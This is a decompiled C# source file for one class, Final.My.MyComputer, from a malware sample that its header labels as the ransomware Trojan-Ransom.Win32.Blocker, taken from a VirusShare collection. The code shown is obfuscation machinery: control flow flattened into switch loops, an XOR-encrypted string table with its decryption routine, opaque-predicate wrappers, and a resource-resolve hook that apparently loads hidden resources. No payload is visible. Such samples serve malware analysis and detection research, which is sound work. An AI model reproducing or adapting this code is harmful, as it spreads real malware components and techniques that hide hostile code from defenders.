// Decompiled with JetBrains decompiler
// Type: Final.My.MyComputer
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Policy;

namespace Final.My
{
  [EditorBrowsable(EditorBrowsableState.Never)]
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  internal sealed class MyComputer : Computer
  {
    private static readonly char[] Ⴅ;
    private static readonly char[] Ⴐ;
    private static readonly string[] Ⴍ;
    internal static MyComputer.Ⴗ Ⴀ;
    private static bool ႨႤ;

    [EditorBrowsable(EditorBrowsableState.Never)]
    public MyComputer()
    {
    }

    static MyComputer()
    {
      int num = 3;
      char[] chArray;
      while (true)
      {
        switch (num)
        {
          case 0:
            chArray[5] = '⿀';
            chArray[1] = '̉';
            goto case 6;
          case 1:
            goto label_8;
          case 2:
          case 7:
            goto label_7;
          case 4:
            chArray[6] = '⟛';
            chArray[3] = 'ථ';
            chArray[0] = '㇟';
            num = 0;
            continue;
          case 5:
            chArray[2] = 'Ⲩ';
            chArray[4] = '\u324C';
            chArray[7] = '㢔';
            num = 4;
            continue;
          case 6:
            MyComputer.Ⴍ = new string[10];
            num = 7;
            continue;
          default:
            MyComputer.ႨႨ();
            MyComputer.Ⴐ = new char[231]
            {
              char.MinValue,
              '\u001C',
              char.MinValue,
              'ㆈ',
              '͠',
              'Ⳇ',
              '෨',
              '\u3223',
              '⾲',
              '➶',
              '㣧',
              'ㆀ',
              '͛',
              'ⳍ',
              '\u0DCD',
              '㈹',
              '⾲',
              '➨',
              '㣽',
              'ㆩ',
              'ͬ',
              'ⳮ',
              'ශ',
              '㈾',
              '⾭',
              '➘',
              '㣦',
              'ㆺ',
              'ͨ',
              'Ⳝ',
              '\u0DCB',
              '\u0001',
              '\u001A',
              char.MinValue,
              '͞',
              'ⳁ',
              'ව',
              '㈊',
              '⾯',
              '➩',
              '㣹',
              'ㆬ',
              '͖',
              '⳻',
              '\u0DCB',
              '\u3229',
              '⾉',
              '➵',
              '㣺',
              'ㆺ',
              'ͻ',
              'Ⳮ',
              'ූ',
              '㈯',
              '⾥',
              '➫',
              '㣠',
              'ㆶ',
              'ͦ',
              'Ⳇ',
              '\u0002',
              '\v',
              char.MinValue,
              '⳥',
              '\u0DC7',
              '㈯',
              '⾲',
              '➴',
              '㣧',
              'ㆰ',
              'ͯ',
              'Ⳝ',
              '\u0D98',
              '㉸',
              '\u0003',
              '\u0001',
              char.MinValue,
              '\u0D80',
              '\u0004',
              '\f',
              char.MinValue,
              '㈜',
              '⾲',
              '➴',
              '㣳',
              'ㆭ',
              'ͬ',
              'ⳛ',
              'ෝ',
              '㈎',
              '⾡',
              '➩',
              '㢥',
              '\u0005',
              '\u0006',
              char.MinValue,
              '⾌',
              '➺',
              '㣶',
              'ㆺ',
              'ͥ',
              'ⲙ',
              '\u0006',
              '\u0005',
              char.MinValue,
              '➝',
              '㣻',
              'ㆭ',
              'ͤ',
              'ⲙ',
              '\a',
              'f',
              char.MinValue,
              '㣉',
              '\u3195',
              'Ι',
              'Ⳅ',
              'ണ',
              '㈇',
              '⾏',
              '⟠',
              '㣹',
              '㆑',
              '͠',
              'ⳣ',
              'ං',
              '\u3222',
              '\u2FFD',
              '➵',
              '㣽',
              'ㆡ',
              '̈́',
              'ಶ',
              '\u0DC9',
              '㈺',
              '\u2FFE',
              '\u2784',
              '㢠',
              'ㅒ',
              '̮',
              'Ⳕ',
              '෭',
              '㉷',
              '⾾',
              '\u2789',
              '㣴',
              '㆞',
              '̤',
              'Ⲃ',
              'ണ',
              '㈍',
              '\u2FEC',
              '⟿',
              '㣺',
              '㆟',
              '̢',
              'Ⳝ',
              'ാ',
              '㉨',
              '⿸',
              '➝',
              '㣲',
              'ㇳ',
              '⌹',
              'Ⲛ',
              'ඖ',
              '㈚',
              '\u0FDE',
              '➡',
              '㢿',
              '\u318F',
              '͞',
              'Ⲉ',
              '෭',
              '\u3229',
              '⺠',
              '\u278A',
              '㣶',
              '\u31E9',
              'ͷ',
              'Ⳗ',
              '\u0DCE',
              '㉾',
              '⾴',
              '\u2793',
              '㣥',
              '㆖',
              '̼',
              'ⳮ',
              'හ',
              '㈑',
              '⾢',
              '⟫',
              '㣠',
              'ㆫ',
              '̿',
              'Ⲟ',
              '෫',
              '\u3220',
              '⿹',
              '⟱',
              '㣄',
              '㆙',
              '⌐',
              '\u2CF4',
              'ි',
              '㉠',
              '⾴',
              '⟲',
              '㣜',
              'ㆳ',
              '̸',
              'ⳑ',
              '\u0D97',
              '㈁',
              '\b',
              '\u0006',
              char.MinValue,
              '㆜',
              'ͥ',
              'ⳉ',
              'ෝ',
              '㈿',
              '⿱',
              '\t',
              '\u0004',
              char.MinValue,
              '̈́',
              'ⳉ',
              '\u0DC7',
              '\u3222'
            };
            chArray = new char[8];
            num = 5;
            continue;
        }
      }
label_8:
      return;
label_7:
      MyComputer.Ⴅ = chArray;
    }

    internal static void Ⴄ([In] WindowsFormsApplicationBase obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 5:
            num1 = 0;
            continue;
          case 2:
          case 3:
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 80:
                num2 = 4;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.SaveMySettingsOnExit = obj1;
    }

    internal static string Ⴈ([In] int obj0, [In] int obj1)
    {
label_3:
      int index1 = obj0 ^ 307275506 ^ obj1;
      char[] ⴐ = MyComputer.Ⴐ;
      int index2 = (int) ⴐ[index1];
      int num1 = 10;
      string str1;
      int length1;
      char[] chArray;
      char[] ⴅ;
      int length2;
      int index3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            int num2 = (int) ⴐ[index1 + 1];
            length1 = ((int) ⴐ[index1 + 2] << 16) + num2;
            num1 = 2;
            continue;
          case 2:
            chArray = new char[length1];
            ⴅ = MyComputer.Ⴅ;
            length2 = ⴅ.Length;
            goto case 9;
          case 3:
            index3 = 0;
            num1 = 6;
            continue;
          case 4:
            goto label_5;
          case 5:
            num1 = 3;
            continue;
          case 6:
            num1 = index3 < length1 ? 13 : 8;
            continue;
          case 7:
          case 13:
            chArray[index3] = (char) ((uint) ⴐ[index1 + index3] ^ (uint) ⴅ[(index3 + index2) % length2]);
            num1 = 11;
            continue;
          case 8:
            goto label_14;
          case 9:
            index1 += 3;
            goto case 5;
          case 10:
            num1 = (str1 = MyComputer.Ⴍ[index2]) == null ? 0 : 4;
            continue;
          case 11:
            index3 = 1 + index3;
            num1 = 6;
            continue;
          case 12:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴈ);
            num1 = 12;
            continue;
        }
      }
label_5:
      return str1;
label_14:
      string str2 = new string(chArray);
      MyComputer.Ⴍ[index2] = str2;
      return str2;
    }

    internal static object Ⴃ(
      [In] ResourceManager obj0,
      [In] string obj1,
      [In] CultureInfo obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_3:
      int num1;
      switch (obj4 ^ obj3)
      {
        case 86:
          num1 = 4;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            num2 = 7;
            continue;
          case 2:
          case 4:
            goto label_8;
          case 3:
            num2 = 7;
            continue;
          case 6:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴃ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return obj0.GetObject(obj1, obj2);
    }

    internal static void Ⴓ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 2;
            continue;
          case 1:
          case 3:
          case 5:
            goto label_7;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 97:
                num2 = 3;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      ProjectData.SetProjectError(obj0);
    }

    internal static bool Ⴜ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 122:
          num1 = 5;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_8;
          case 6:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.Ⴜ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.EndsWith(obj1);
    }

    internal static void ႨႨ()
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_4;
          default:
            if (!MyComputer.ႨႤ)
            {
              num1 = 0;
              continue;
            }
            goto label_10;
        }
      }
label_10:
      return;
label_4:
      lock (typeof (MyComputer))
      {
        int num2 = 0;
        while (true)
        {
          switch (num2)
          {
            case 1:
              MyComputer.ႨႤ = true;
              goto case 3;
            case 2:
            case 4:
            case 5:
              goto label_12;
            case 3:
              AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(Ⴃ.Ⴈ.Ⴓ.Ⴄ);
              num2 = 4;
              continue;
            default:
              num2 = MyComputer.ႨႤ ? 4 : 1;
              continue;
          }
        }
      }
label_12:
      int num3 = 3;
      while (true)
      {
        switch (num3)
        {
          case 1:
            goto label_16;
          case 2:
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyComputer.ႨႨ);
            num3 = 1;
            continue;
          default:
            num3 = 1;
            continue;
        }
      }
label_16:;
    }

    internal static Evidence ႨႥ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 126)
      {
        case 0:
          return obj0.Evidence;
        default:
          goto label_0;
      }
    }

    internal static string[] ႨႰ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 34)
      {
        case 0:
          return obj0.GetManifestResourceNames();
        default:
          goto label_0;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 462, Pack = 1)]
    private struct Ⴗ
    {
    }
  }
}
